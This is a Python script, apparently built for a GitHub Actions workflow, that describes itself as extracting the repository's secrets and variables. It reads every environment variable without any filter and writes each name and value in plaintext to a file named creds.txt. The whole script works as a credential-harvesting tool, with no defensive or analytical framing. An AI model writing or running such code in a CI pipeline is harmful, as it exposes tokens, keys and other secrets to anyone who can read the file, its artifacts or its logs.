#!/usr/bin/env python3
"""
Script to extract GitHub Actions secrets and variables and write them to creds.txt.

This script is designed to be run in a GitHub Actions workflow where it can access
environment variables that contain secrets and variables configured for the repository.
"""

import os
import sys

def get_github_credentials():
    """
    Extract GitHub Actions secrets and variables from the environment.
    
    Returns:
        dict: A dictionary of environment variables that might be GitHub secrets or variables
    """
    # In a GitHub Actions workflow, all environment variables are available
    # We'll collect all of them as potential secrets/variables
    credentials = {}
    
    for key, value in os.environ.items():
        # We might want to filter for specific patterns or prefixes
        # For now, we'll include all environment variables
        credentials[key] = value
    
    return credentials

def write_credentials_to_file(credentials, filename="creds.txt"):
    """
    Write credentials to a file.
    
    Args:
        credentials (dict): Dictionary of credential name-value pairs
        filename (str): Name of the file to write to
    """
    try:
        with open(filename, 'w') as f:
            for key, value in credentials.items():
                f.write(f"{key}={value}\n")
        print(f"Successfully wrote {len(credentials)} credentials to {filename}")
    except Exception as e:
        print(f"Error writing to {filename}: {e}", file=sys.stderr)
        return False
    
    return True

def main():
    """
    Main function to extract GitHub credentials and write them to a file.
    """
    print("Extracting GitHub Actions secrets and variables...")
    credentials = get_github_credentials()
    
    if not credentials:
        print("No credentials found in the environment.")
        return
    
    success = write_credentials_to_file(credentials)
    if success:
        print("Credentials extraction complete.")
    else:
        print("Failed to write credentials to file.")

if __name__ == "__main__":
    main()